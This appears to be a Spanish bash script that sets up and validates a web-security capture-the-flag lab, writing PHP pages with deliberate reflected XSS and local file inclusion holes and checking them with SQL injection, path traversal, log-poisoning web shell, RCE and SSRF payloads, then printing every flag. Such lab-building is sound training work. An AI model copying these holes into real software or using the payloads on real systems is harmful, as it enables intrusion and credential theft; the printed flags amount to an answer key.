#!/bin/bash
# =============================================================================
# CTF MGP — FIX REAL: ServerAlias en VirtualHost XSS + LFI open_basedir
# =============================================================================

VERDE="\e[32m"; AMARILLO="\e[33m"; ROJO="\e[31m"
AZUL="\e[34m"; NEGRITA="\e[1m"; RESET="\e[0m"

[ "$EUID" -ne 0 ] && { echo -e "${ROJO}Ejecutar como root${RESET}"; exit 1; }

echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   CTF MGP — Fix Real: ServerAlias XSS + LFI open_basedir    ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3")
HOSTNAME=$(hostname -f 2>/dev/null || hostname 2>/dev/null || echo "servidorctf")

echo -e "${AMARILLO}[*] Hostname detectado: $HOSTNAME${RESET}"
echo -e "${AMARILLO}[*] PHP versión: $PHP_VER${RESET}"
echo ""

# =============================================================================
# FIX 1 — XSS: añadir ServerName + ServerAlias que cubra todos los accesos
# =============================================================================
echo -e "${AMARILLO}[FIX 1] VirtualHost XSS con ServerAlias completo...${RESET}"

cat > /etc/apache2/sites-available/xss-ctf.conf <<APACHEEOF
<VirtualHost *:8181>
    ServerName ${HOSTNAME}
    ServerAlias localhost 127.0.0.1 192.168.125.150

    DocumentRoot /var/www/html/xss
    DirectoryIndex index.php index.html

    <Directory /var/www/html/xss>
        Options -Indexes
        AllowOverride None
        Require all granted
    </Directory>

    ErrorLog  \${APACHE_LOG_DIR}/xss_error.log
    CustomLog \${APACHE_LOG_DIR}/xss_access.log combined
</VirtualHost>
APACHEEOF

echo -e "${VERDE}    [OK] VirtualHost con ServerName=$HOSTNAME + ServerAlias${RESET}"
a2ensite xss-ctf.conf 2>/dev/null || true

# Verificar que los archivos PHP existen
if [ ! -f /var/www/html/xss/index.php ]; then
    echo -e "${AMARILLO}    Recreando archivos XSS...${RESET}"
    mkdir -p /var/www/html/xss

    cat > /var/www/html/xss/index.php <<'PHPEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Fast-Ship Rastreo</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f4f6f8;font-family:sans-serif;color:#1a1a2e}
header{background:#1a1a2e;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:16px}
header h1{font-size:22px;font-weight:700}header span{font-size:12px;color:#a0aec0}
.hero{background:#16213e;color:#fff;padding:60px 40px;text-align:center}
.hero h2{font-size:28px;margin-bottom:12px}
.hero p{color:#a0aec0;margin-bottom:28px}
.search-box{display:flex;max-width:500px;margin:0 auto}
.search-box input{flex:1;padding:13px 16px;border:none;border-radius:8px 0 0 8px;font-size:14px;outline:none}
.search-box button{padding:13px 22px;background:#e94560;color:#fff;border:none;border-radius:0 8px 8px 0;cursor:pointer;font-weight:600}
footer{text-align:center;padding:18px;color:#a0aec0;font-size:12px;border-top:1px solid #e2e8f0}
</style>
</head>
<body>
<header><div><h1>Fast-Ship</h1><span>Logistica y Rastreo Internacional</span></div></header>
<div class="hero">
  <h2>Rastrea tu paquete en tiempo real</h2>
  <p>Ingresa el numero de guia o nombre del remitente</p>
  <form class="search-box" action="search.php" method="GET">
    <input type="text" name="query" placeholder="Numero de guia...">
    <button type="submit">Buscar</button>
  </form>
</div>
<footer>Fast-Ship Logistics 2026</footer>
</body>
</html>
PHPEOF

    cat > /var/www/html/xss/search.php <<'PHPEOF'
<?php
header("Set-Cookie: session_flag=Comciberdef{xss_reflected_2026_found}; path=/");
$query = $_GET['query'] ?? '';
?><!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8"><title>Fast-Ship Resultados</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f4f6f8;font-family:sans-serif;color:#1a1a2e}
header{background:#1a1a2e;color:#fff;padding:16px 40px;display:flex;align-items:center;justify-content:space-between}
header h1{font-size:20px;font-weight:700}
.container{max-width:700px;margin:40px auto;padding:0 20px}
.box{background:#fff;border-radius:10px;padding:28px;box-shadow:0 2px 10px rgba(0,0,0,.07)}
.box h2{font-size:17px;margin-bottom:8px}
.echo{background:#edf2f7;border-left:4px solid #e94560;padding:12px 16px;margin:14px 0}
.msg{color:#718096;font-size:14px;margin-top:12px}
.back{display:inline-block;margin-top:20px;color:#e94560;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<header>
  <h1>Fast-Ship</h1>
  <a href="index.php" style="color:#a0aec0;font-size:13px;text-decoration:none">Volver</a>
</header>
<div class="container">
  <div class="box">
    <h2>Resultados de busqueda</h2>
    <p style="font-size:13px;color:#718096">Buscaste:</p>
    <div class="echo"><?php echo $query; ?></div>
    <div class="msg">No se encontraron resultados.</div>
    <a class="back" href="index.php">Nueva busqueda</a>
  </div>
</div>
</body>
</html>
PHPEOF
fi

chown -R www-data:www-data /var/www/html/xss
chmod 755 /var/www/html/xss
chmod 644 /var/www/html/xss/*.php
echo -e "${VERDE}    [OK] Archivos XSS verificados${RESET}"

# =============================================================================
# FIX 2 — LFI: vaciar open_basedir en php.ini de Apache
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 2] Vaciando open_basedir en Apache php.ini...${RESET}"

PHP_INI="/etc/php/${PHP_VER}/apache2/php.ini"
if [ -f "$PHP_INI" ]; then
    sed -i 's|^open_basedir\s*=.*|open_basedir =|' "$PHP_INI"
    echo -e "${VERDE}    [OK] $(grep '^open_basedir' "$PHP_INI")${RESET}"
fi

# Reescribir index.php LFI
tee /var/www/html/lfi/index.php > /dev/null <<'PHPEOF'
<?php
ini_set('open_basedir', '');
ini_set('display_errors', 0);

$log_file = '/var/log/app/access.log';
$ip   = $_SERVER['REMOTE_ADDR']     ?? '0.0.0.0';
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$uri  = $_SERVER['REQUEST_URI']     ?? '/';
$page = $_GET['page']               ?? '';
$ts   = date('Y-m-d H:i:s');

$entry = "[$ts] $ip GET $uri \"$ua\" 200\n";
@file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);

if ($page !== '') { @include($page); }
?><!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8"><title>COMCIBERDEF Log Viewer v2.3.1</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#c9d1d9;font-family:sans-serif;min-height:100vh}
header{background:#16213e;border-bottom:2px solid #0f3460;padding:14px 32px;display:flex;align-items:center;gap:16px}
header h1{font-size:17px;color:#e94560;font-weight:700}
header span{font-size:11px;color:#718096;margin-left:auto}
.layout{display:flex;min-height:calc(100vh - 52px)}
.sidebar{width:200px;background:#16213e;border-right:1px solid #0f3460;padding:18px}
.sidebar h3{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#718096;margin-bottom:10px}
.sidebar a{display:block;padding:8px 10px;border-radius:5px;color:#a0aec0;font-size:13px;text-decoration:none;margin-bottom:3px}
.sidebar a:hover,.sidebar a.active{background:#0f3460;color:#fff}
.main{flex:1;padding:24px}
.content-area{background:#16213e;border:1px solid #0f3460;border-radius:8px;padding:24px;line-height:1.7}
.content-area h2{color:#e94560;margin-bottom:12px;font-size:17px}
.content-area p{color:#a0aec0;font-size:14px;margin-bottom:8px}
.content-area code{background:#0f3460;padding:2px 5px;border-radius:3px;font-family:monospace;color:#63b3ed;font-size:12px}
.meta{font-size:11px;color:#4a5568;margin-top:20px;padding-top:10px;border-top:1px solid #0f3460}
</style>
</head>
<body>
<header>
  <h1>COMCIBERDEF Log Viewer v2.3.1</h1>
  <span>SISTEMA INTERNO</span>
</header>
<div class="layout">
  <div class="sidebar">
    <h3>Navegacion</h3>
    <a href="?page=pages/home.php"    class="<?=($page==='pages/home.php')?'active':''?>">Inicio</a>
    <a href="?page=pages/news.php"    class="<?=($page==='pages/news.php')?'active':''?>">Novedades</a>
    <a href="?page=pages/contact.php" class="<?=($page==='pages/contact.php')?'active':''?>">Soporte</a>
    <div style="margin-top:20px;padding-top:14px;border-top:1px solid #0f3460">
      <h3>Sistema</h3>
      <a href="?page=pages/home.php">Ver Logs</a>
    </div>
  </div>
  <div class="main">
    <?php if($page===''): ?>
    <div class="content-area">
      <h2>Bienvenido</h2>
      <p>Selecciona del menu o usa <code>?page=</code></p>
      <p style="margin-top:10px">Logs en: <code>/var/log/app/access.log</code></p>
    </div>
    <?php endif; ?>
    <div class="meta">Log: <?=htmlspecialchars($log_file)?> | IP: <?=htmlspecialchars($ip)?></div>
  </div>
</div>
</body>
</html>
PHPEOF
chown www-data:www-data /var/www/html/lfi/index.php
echo -e "${VERDE}    [OK] LFI index.php reescrito${RESET}"

# =============================================================================
# REINICIAR APACHE
# =============================================================================
echo ""
echo -e "${AMARILLO}[*] Reiniciando Apache...${RESET}"
apache2ctl configtest 2>&1 | grep -q "Syntax OK" && \
    systemctl restart apache2 && sleep 2 && \
    echo -e "${VERDE}    [OK] Apache reiniciado${RESET}" || \
    { apache2ctl configtest 2>&1; exit 1; }

echo -e "${AMARILLO}    VirtualHosts:${RESET}"
apache2ctl -S 2>&1 | grep -E "namevhost|port" | head -10 || true

# =============================================================================
# VALIDACIÓN
# =============================================================================
echo ""
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo -e "${NEGRITA}  VALIDACIÓN FINAL${RESET}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""

PASS=0; FAIL=0
ok()   { echo -e "  ${VERDE}[OK]${RESET}   $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${ROJO}[FAIL]${RESET} $1"; FAIL=$((FAIL+1)); }
chk_http() {
    local C; C=$(curl -s -o /dev/null -w "%{http_code}" "$2" 2>/dev/null || echo "000")
    [ "$C" = "$3" ] && ok "$1 (HTTP $C)" || fail "$1 (esperado $3, got $C)"
}
chk_body() {
    local B; B=$(curl -s "$2" 2>/dev/null || echo "")
    echo "$B" | grep -q "$3" && ok "$1" || fail "$1"
}

echo -e "${AMARILLO}── Reto 1 ──${RESET}"
chk_http "/sqli-login/" "http://localhost/sqli-login/" "200"
B=$(curl -sL --data "username=%27+OR+1%3D1+LIMIT+4%2C1+--+-&password=x" \
    "http://localhost/sqli-login/" 2>/dev/null)
echo "$B" | grep -q "Comciberdef{sqli_bypass_2026_ok}" && \
    ok "SQLi bypass → flag" || fail "SQLi bypass"

echo ""
echo -e "${AMARILLO}── Reto 2 XSS (:8181) ──${RESET}"
# Probar con ambos hostnames
CODE_LOC=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://localhost:8181/xss/" 2>/dev/null || echo "000")
CODE_IP=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://192.168.125.150:8181/xss/" 2>/dev/null || echo "000")
CODE_HN=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://${HOSTNAME}:8181/xss/" 2>/dev/null || echo "000")
echo -e "    localhost:8181     → HTTP $CODE_LOC"
echo -e "    192.168.125.150:8181 → HTTP $CODE_IP"
echo -e "    ${HOSTNAME}:8181 → HTTP $CODE_HN"

[ "$CODE_IP" = "200" ] && ok ":8181/xss/ accesible via IP" || \
    fail ":8181/xss/ (esperado 200, got $CODE_IP)"

chk_body "Refleja input" \
    "http://192.168.125.150:8181/xss/search.php?query=CTF2026" "CTF2026"
HDRS=$(curl -sI "http://192.168.125.150:8181/xss/search.php?query=x" 2>/dev/null)
echo "$HDRS" | grep -qi "Comciberdef{xss_reflected_2026_found}" && \
    ok "Cookie flag presente" || fail "Cookie flag ausente"

echo ""
echo -e "${AMARILLO}── Reto 3 ──${RESET}"
chk_http "/sqli-blind/" "http://localhost/sqli-blind/" "200"
chk_body "Oráculo TRUE"  "http://localhost/sqli-blind/?id=1+AND+1%3D1" "encontrado"
chk_body "Oráculo FALSE" "http://localhost/sqli-blind/?id=1+AND+1%3D2" "no disponible"

echo ""
echo -e "${AMARILLO}── Reto 4 LFI ──${RESET}"
chk_http "/lfi/" "http://localhost/lfi/" "200"
chk_body "LFI /etc/passwd" "http://localhost/lfi/?page=../../../etc/passwd" "root:x"
curl -s -A '<?php system($_GET["cmd"]); ?>' \
    "http://localhost/lfi/?page=pages/home.php" > /dev/null 2>&1
sleep 0.5
chk_body "Log Poisoning + RCE" \
    "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" "Comciberdef"
printf '[2026-01-15 08:00:00] 192.168.125.40 GET /lfi/ "Mozilla/5.0" 200\n' \
    > /var/log/app/access.log
chown www-data:www-data /var/log/app/access.log

echo ""
echo -e "${AMARILLO}── Reto 5 SSRF ──${RESET}"
[ "$(systemctl is-active ctf-metadata 2>/dev/null)" = "active" ] && \
    ok "ctf-metadata activo" || fail "ctf-metadata inactivo"
[ "$(systemctl is-active ctf-storage 2>/dev/null)" = "active" ] && \
    ok "ctf-storage activo" || fail "ctf-storage inactivo"
TOKEN="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"
F=$(curl -s -H "Authorization: Bearer $TOKEN" \
    "http://127.0.0.1:9999/secret/flag.txt" 2>/dev/null)
echo "$F" | grep -q "Comciberdef{ssrf_bypass_2026_master}" && \
    ok "Storage entrega flag" || fail "Storage no entrega flag"
chk_body "SSRF bypass 0.0.0.0" \
    "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" \
    "Token"
chk_http "/ssrf/" "http://localhost/ssrf/" "200"

# RESUMEN
echo ""
TOTAL=$((PASS+FAIL))
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
printf "${NEGRITA}  RESULTADO: %d/%d controles\n${RESET}" "$PASS" "$TOTAL"
[ "$FAIL" -eq 0 ] && \
    echo -e "${VERDE}${NEGRITA}  ✓ TODOS LOS RETOS WEB LISTOS${RESET}" || \
    echo -e "${ROJO}${NEGRITA}  ✗ $FAIL fallaron${RESET}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""
echo "  R1 → http://192.168.125.150/sqli-login/       │ Comciberdef{sqli_bypass_2026_ok}"
echo "  R2 → http://192.168.125.150:8181/xss/         │ Comciberdef{xss_reflected_2026_found}"
echo "  R3 → http://192.168.125.150/sqli-blind/       │ Comciberdef{NavalCiber2026}"
echo "  R4 → http://192.168.125.150/lfi/              │ Comciberdef{lfi_log_poison_rce_2026}"
echo "  R5 → http://192.168.125.150/ssrf/             │ Comciberdef{ssrf_bypass_2026_master}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
